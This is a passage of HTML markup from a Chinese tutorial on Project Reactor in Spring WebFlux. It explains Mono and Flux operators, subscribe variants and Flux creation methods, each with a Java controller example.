class="hljs-string">&quot;任务完成&quot;</span>;<br>                &#125;)<br>                .subscribeOn(Schedulers.boundedElastic()); <span class="hljs-comment">// 指定任务在线程池中执行</span><br>    &#125;<br><br>    <span class="hljs-comment">// 3. publishOn(Scheduler scheduler)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/publishOn&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Mono&lt;String&gt; publishOnExample() &#123;<br>        <span class="hljs-keyword">return</span> Mono.just(<span class="hljs-string">&quot;原始数据&quot;</span>)<br>                .doOnNext(<span class="hljs-keyword">data</span> -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;步骤1线程：&quot;</span> + Thread.currentThread().getName()))<br>                .publishOn(Schedulers.parallel())  <span class="hljs-comment">// 后续操作切换线程</span><br>                .map(<span class="hljs-keyword">data</span> -&gt; &#123;<br>                    System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;步骤2线程：&quot;</span> + Thread.currentThread().getName());<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;处理后的数据：&quot;</span> + <span class="hljs-keyword">data</span>;<br>                &#125;);<br>    &#125;<br><br>    <span class="hljs-comment">// 4. timeout(Duration timeout)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/timeout&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Mono&lt;String&gt; timeoutExample() &#123;<br>        <span class="hljs-keyword">return</span> Mono.delay(Duration.ofSeconds(<span class="hljs-number">3</span>)) <span class="hljs-comment">// 故意延迟</span><br>                .map(time -&gt; <span class="hljs-string">&quot;数据来了&quot;</span>)<br>                .timeout(Duration.ofSeconds(<span class="hljs-number">2</span>))  <span class="hljs-comment">// 设置超时时间</span><br>                .onErrorReturn(<span class="hljs-string">&quot;请求超时，返回默认值&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h6 id="5-2-3-7-其他实用方法"><a href="#5-2-3-7-其他实用方法" class="headerlink" title="5.2.3.7. 其他实用方法"></a>5.2.3.7. 其他实用方法</h6><table><thead><tr><th><code>doOnNext(Consumer&lt;? super T&gt; onNext)</code></th><th>每当流发出一个元素时执行指定副作用（如日志、指标统计），但不改变元素本身；就像在传送带上做一次检查打标。</th></tr></thead><tbody><tr><td><code>doOnError(Consumer&lt;? super Throwable&gt; onError)</code></td><td>流遇到错误时执行副作用（如记录日志、告警），然后再把错误继续抛给下游；适合在错误点插入埋点或监控。</td></tr><tr><td><code>doOnComplete(Runnable onComplete)</code></td><td>在流正常走完所有元素后执行一次副作用，如资源释放或完成通知；就像闭环操作中的收尾仪式。</td></tr><tr><td><code>doOnSubscribe(Consumer&lt;? super Subscription&gt; onSubscribe)</code></td><td>订阅者发起订阅时触发，用于记录或处理初次订阅行为，比如打日志或初始化状态。</td></tr><tr><td><code>doFinally(Consumer&lt;SignalType&gt; onFinally)</code></td><td>在流终止时（无论正常完成、取消、还是出错）都执行指定副作用，相当于 finally 块，常用于收尾清理等场景。</td></tr><tr><td><code>log()</code></td><td>自动在控制台打印 Mono 的信号轨迹，包括订阅、请求、发出元素、完成和错误，帮你像放监控摄像头一样随时看流水线状态。</td></tr><tr><td><code>cache()</code></td><td>将流转换为可重放的热流，缓存所有元素，后续订阅者会立刻看到之前的数据，无需再次执行上游逻辑；适合昂贵操作的结果复用。</td></tr><tr><td><code>share()</code></td><td>也会把 Cold Mono 变成 Hot Mono，但不缓存旧数据，所有订阅者共享同一份数据流，适合广播式分发；就像把演唱会直播送给多个观众同时观看。</td></tr></tbody></table><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/api&quot;</span>)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SideEffectOperators</span> &#123;<br><br>    <span class="hljs-comment">// 1. doOnNext(Consumer&lt;? super T&gt; onNext)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/doOnNext&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;String&gt; doOnNextExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>                .doOnNext(<span class="hljs-keyword">val</span> -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;元素通过检查：&quot;</span> + <span class="hljs-keyword">val</span>))<br>                .map(String::toLowerCase);<br>    &#125;<br><br>    <span class="hljs-comment">// 2. doOnError(Consumer&lt;? super Throwable&gt; onError)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/doOnError&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Mono&lt;String&gt; doOnErrorExample() &#123;<br>        <span class="hljs-keyword">return</span> Mono.&lt;String&gt;error(new RuntimeException(<span class="hljs-string">&quot;模拟错误&quot;</span>))<br>                .doOnError(err -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;记录错误日志：&quot;</span> + err.getMessage()));<br>    &#125;<br><br>    <span class="hljs-comment">// 3. doOnComplete(Runnable onComplete)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/doOnComplete&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;String&gt; doOnCompleteExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>                .doOnComplete(() -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;流处理完毕，收工！&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-comment">// 4.doOnSubscribe(Consumer&lt;? super Subscription&gt; onSubscribe)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/doOnSubscribe&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Mono&lt;String&gt; doOnSubscribeExample() &#123;<br>        <span class="hljs-keyword">return</span> Mono.just(<span class="hljs-string">&quot;准备启动流程&quot;</span>)<br>                .doOnSubscribe(sub -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;收到订阅请求，开始处理&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-comment">// 5. doFinally(Consumer&lt;SignalType&gt; onFinally)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/doFinally&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Mono&lt;String&gt; doFinallyExample() &#123;<br>        <span class="hljs-keyword">return</span> Mono.just(<span class="hljs-string">&quot;最终操作&quot;</span>)<br>                .map(<span class="hljs-keyword">val</span> -&gt; &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">val</span>.equals(<span class="hljs-string">&quot;最终操作&quot;</span>)) <span class="hljs-keyword">throw</span> new RuntimeException(<span class="hljs-string">&quot;模拟终止&quot;</span>);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">val</span>;<br>                &#125;)<br>                .doFinally(signal -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;流终止信号类型：&quot;</span> + signal));<br>    &#125;<br><br>    <span class="hljs-comment">// 6. log()</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/log&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;String&gt; logExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;Z&quot;</span>)<br>                .log(); <span class="hljs-comment">// 控制台打印信号日志（订阅、请求、发出、完成等）</span><br>    &#125;<br><br>    <span class="hljs-comment">// 7. cache()</span><br>    Mono&lt;String&gt; cachedMono = Mono.fromSupplier(() -&gt; &#123;<br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;执行昂贵操作...&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;昂贵结果&quot;</span>;<br>    &#125;).cache();<br><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/cache&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Mono&lt;String&gt; cacheExample() &#123;<br>        <span class="hljs-keyword">return</span> cachedMono; <span class="hljs-comment">// 不会再次执行昂贵操作</span><br>    &#125;<br><br>    <span class="hljs-comment">// 8. share()</span><br>    Flux&lt;<span class="hljs-built_in">Long</span>&gt; sharedFlux = Flux.interval(Duration.ofSeconds(<span class="hljs-number">1</span>))<br>            .map(<span class="hljs-keyword">val</span> -&gt; <span class="hljs-keyword">val</span> + <span class="hljs-number">1</span>)<br>            .doOnSubscribe(sub -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;开始生成直播数据&quot;</span>))<br>            .share();<br><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/share&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;<span class="hljs-built_in">Long</span>&gt; shareExample() &#123;<br>        <span class="hljs-keyword">return</span> sharedFlux.take(<span class="hljs-number">5</span>); <span class="hljs-comment">// 每个订阅者看到的是“正在直播”的状态</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="5-2-3-8-订阅方法"><a href="#5-2-3-8-订阅方法" class="headerlink" title="5.2.3.8. 订阅方法"></a>5.2.3.8. 订阅方法</h6><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/api&quot;</span>)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SubscribeVariants</span> &#123;<br><br>    <span class="hljs-comment">// 1. subscribe()</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/subscribe-empty&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> String subscribeEmptyExample() &#123;<br>        Flux&lt;String&gt; flux = Flux.just(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>                .doOnNext(<span class="hljs-keyword">val</span> -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;处理元素：&quot;</span> + <span class="hljs-keyword">val</span>));<br><br>        flux.subscribe(); <span class="hljs-comment">// 什么都不处理，但触发了执行</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;subscribe() 执行完毕（请看控制台）&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 2. subscribe(Consumer&lt;? super T&gt; onNext)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/subscribe-onNext&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> String subscribeOnNextExample() &#123;<br>        Flux&lt;String&gt; flux = Flux.just(<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;Z&quot;</span>);<br><br>        flux.subscribe(<span class="hljs-keyword">val</span> -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;收到元素：&quot;</span> + <span class="hljs-keyword">val</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;subscribe(onNext) 执行完毕（请看控制台）&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 3. subscribe(Consumer&lt;? super T&gt; onNext, Consumer&lt;? super Throwable&gt; onError, Runnable onComplete)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/subscribe-full&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> String subscribeFullExample() &#123;<br>        Flux&lt;String&gt; flux = Flux.just(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>                .map(<span class="hljs-keyword">val</span> -&gt; &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">val</span>.equals(<span class="hljs-string">&quot;error&quot;</span>)) &#123;<br>                        <span class="hljs-keyword">throw</span> new RuntimeException(<span class="hljs-string">&quot;遇到非法值：&quot;</span> + <span class="hljs-keyword">val</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">val</span>;<br>                &#125;);<br><br>        flux.subscribe(<br>                <span class="hljs-keyword">val</span> -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;接收到：&quot;</span> + <span class="hljs-keyword">val</span>),<br>                err -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;发生错误：&quot;</span> + err.getMessage()),<br>                () -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;流处理完成！&quot;</span>)<br>        );<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;subscribe(onNext, onError, onComplete) 执行完毕（请看控制台）&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="6-Flux"><a href="#6-Flux" class="headerlink" title="6. Flux"></a>6. Flux</h3><h4 id="6-1-Flux-相关方法"><a href="#6-1-Flux-相关方法" class="headerlink" title="6.1. Flux 相关方法"></a>6.1. Flux 相关方法</h4><h5 id="6-1-1-Flux-实例创建方法"><a href="#6-1-1-Flux-实例创建方法" class="headerlink" title="6.1.1. Flux 实例创建方法"></a>6.1.1. Flux 实例创建方法</h5><p>&#x3D;&#x3D;1.从已有数据构建流&#x3D;&#x3D;<br>当你手头已经有数据（数组、集合、Stream 等），直接封装成 Flux 发出去。</p><ol><li><code>Flux.just(T... data)</code><ol><li>从确定且非 <code>null</code> 的值创建 Flux（可以为空字符串 <code>&quot;&quot;</code>），<strong>依次</strong>发出各值所有元素，适合少量数据</li></ol></li><li><code>Flux.fromArray(T[] array)</code><ol><li>从 <code>Array</code> 数组创建 Flux</li></ol></li><li><code>Flux.fromIterable(Iterable&lt;T&gt; it)</code>：<ol><li>从 <code>Iterable</code>创建 Flux（List、Set、Queue），依次发出所有元素<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/api&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactiveExample</span> &#123;<br><br>    <span class="hljs-comment">// 1. Flux.just(T... data)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/just&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">just</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 2. Flux.fromArray(T[] array)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/fromArray&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">fromArray</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">String</span>[] arr = &#123;<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;Z&quot;</span>&#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">fromArray</span>(arr);<br>    &#125;<br><br>    <span class="hljs-comment">// 3. Flux.fromIterable(Iterable&lt;T&gt; it)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/fromIterable&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">Integer</span>&gt; <span class="hljs-title function_">fromIterable</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Integer</span>&gt; list = <span class="hljs-title class_">Arrays</span>.<span class="hljs-title function_">asList</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">fromIterable</span>(list);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><p>&#x3D;&#x3D;2.按规则动态生成数据&#x3D;&#x3D;<br>不依赖已有数据，而是代码里一个个“造”出来，适合序列、状态机等。</p><ol><li><code>Flux.range(int start, int count)</code><ol><li>创建一个从 start 开始，连续发出 count 个整数的 Flux。</li></ol></li><li><code>Flux.generate(Callable&lt;S&gt; stateSupplier，BiFunction&lt;S，SynchronousSink&lt;T&gt;，S&gt;generator)</code><ol><li>动态生成元素，适合需要状态控制的场景。</li></ol></li><li><code>Flux.defer(Supplier&lt;? extends Publisher&lt;T&gt;&gt; supplier)</code><ol><li>延迟创建 <code>Flux</code>，每次订阅时重新生成数据<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs pf">@RestController<br>@RequestMapping(<span class="hljs-string">&quot;/api&quot;</span>)<br>public class ReactiveExample &#123;<br><br>    // <span class="hljs-number">1</span>. Flux.range(int start, int count)<br>    @GetMapping(<span class="hljs-string">&quot;/range&quot;</span>)<br>    public Flux<span class="hljs-variable">&lt;Integer&gt;</span> range() &#123;<br>        return Flux.range(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>);<br>    &#125;<br><br>    // <span class="hljs-number">2</span>. Flux.generate(Callable<span class="hljs-variable">&lt;S&gt;</span> <span class="hljs-keyword">state</span>Supplier, BiFunction<span class="hljs-variable">&lt;S, SynchronousSink&lt;T&gt;</span>, S&gt; generator)<br>    @GetMapping(<span class="hljs-string">&quot;/generate&quot;</span>)<br>    public Flux<span class="hljs-variable">&lt;Integer&gt;</span> generate() &#123;<br>        return Flux.generate(<br>            () -&gt; <span class="hljs-number">0</span>,<br>            (<span class="hljs-keyword">state</span>, sink) -&gt; &#123;<br>                sink.next(<span class="hljs-keyword">state</span>);<br>                if (<span class="hljs-keyword">state</span> &gt;= <span class="hljs-number">4</span>) sink.complete();<br>                return <span class="hljs-keyword">state</span> + <span class="hljs-number">1</span>;<br>            &#125;<br>        );<br>    &#125;<br><br>    // <span class="hljs-number">3</span>. Flux.defer(Supplier<span class="hljs-variable">&lt;? extends Publisher&lt;T&gt;</span>&gt; supplier)<br>    @GetMapping(<span class="hljs-string">&quot;/defer&quot;</span>)<br>    public Flux<span class="hljs-variable">&lt;Long&gt;</span> defer() &#123;<br>        return Flux.defer(() -&gt; Flux.just(System.currentTimeMillis()));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol></li></ol><p>&#x3D;&#x3D;3.基于异步回调的数据流&#x3D;&#x3D;<br>数据来自外部事件、回调、异步任务，推模式为主。</p><ol><li><code>Flux.create(Consumer&lt;FluxSink&lt;T&gt;&gt;emitter)</code><ol><li>提供更灵活的控制，适合异步或外部事件驱动的场景。<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@RestController</span><br><span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">&quot;/api&quot;</span>)<br>public class ReactiveExample &#123;<br><br>    <span class="hljs-comment">// 1. Flux.create(Consumer&lt;FluxSink&lt;T&gt;&gt; emitter)</span><br>    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">&quot;/create&quot;</span>)<br>    public Flux&lt;String&gt; <span class="hljs-built_in">create</span>() &#123;<br>        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">Flux</span><span class="hljs-selector-class">.create</span>(emitter -&gt; &#123;<br>            <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">Thread</span>(() -&gt; &#123;<br>                <span class="hljs-selector-tag">emitter</span><span class="hljs-selector-class">.next</span>(<span class="hljs-string">&quot;async-1&quot;</span>);<br>                <span class="hljs-selector-tag">emitter</span><span class="hljs-selector-class">.next</span>(<span class="hljs-string">&quot;async-2&quot;</span>);<br>                <span class="hljs-selector-tag">emitter</span><span class="hljs-selector-class">.complete</span>();<br>            &#125;)<span class="hljs-selector-class">.start</span>();<br>        &#125;);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol></li></ol><p>&#x3D;&#x3D;4.基于时间调度创建流&#x3D;&#x3D;<br>按照固定时间间隔发出数据，用于轮询、心跳、定时任务等。</p><ol><li><code>Flux.interval(Duration period)</code><ol><li>按固定时间间隔发出递增的长整型数字（从 0 开始）</li></ol></li><li><code>Flux.interval(Duration delay, Duration period)</code><ol><li>指定初始延迟和间隔时间<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/api&quot;</span>)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactiveExample</span> &#123;<br><br>    <span class="hljs-comment">// 1. Flux.interval(Duration period)</span><br>    <span class="hljs-meta">@GetMapping(value = <span class="hljs-string">&quot;/interval&quot;</span>, produces = MediaType.TEXT_EVENT_STREAM_VALUE)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;<span class="hljs-built_in">Long</span>&gt; interval() &#123;<br>        <span class="hljs-keyword">return</span> Flux.interval(Duration.ofSeconds(<span class="hljs-number">1</span>));<br>    &#125;<br><br>    <span class="hljs-comment">// 2. Flux.interval(Duration delay, Duration period)</span><br>    <span class="hljs-meta">@GetMapping(value = <span class="hljs-string">&quot;/intervalWithDelay&quot;</span>, produces = MediaType.TEXT_EVENT_STREAM_VALUE)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;<span class="hljs-built_in">Long</span>&gt; intervalWithDelay() &#123;<br>        <span class="hljs-keyword">return</span> Flux.interval(Duration.ofSeconds(<span class="hljs-number">3</span>), Duration.ofSeconds(<span class="hljs-number">1</span>));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol></li></ol><p>&#x3D;&#x3D;5.控制型流（空流、异常、无限挂起）&#x3D;&#x3D;<br>不发真实数据，用于流程控制、占位、异常测试等。</p><ol><li><code>Flux.empty()</code><ol><li>创建一个不发出任何元素直接完成的 &#96;Flux</li></ol></li><li><code>Flux.error(Throwable throwable)</code><ol><li>创建一个发出错误信号的 <code>Flux</code>。</li></ol></li><li><code>Flux.never()</code><ol><li>创建一个不发出任何信号（不发出元素、不完成、不出错）的 <code>Flux</code>。<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/api&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactiveExample</span> &#123;<br><br>    <span class="hljs-comment">// 1. Flux.empty()</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/empty&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">empty</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">empty</span>();<br>    &#125;<br><br>    <span class="hljs-comment">// 2. Flux.error(Throwable throwable)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/error&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">error</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">error</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Something went wrong&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-comment">// 3. Flux.never()</span><br>    <span 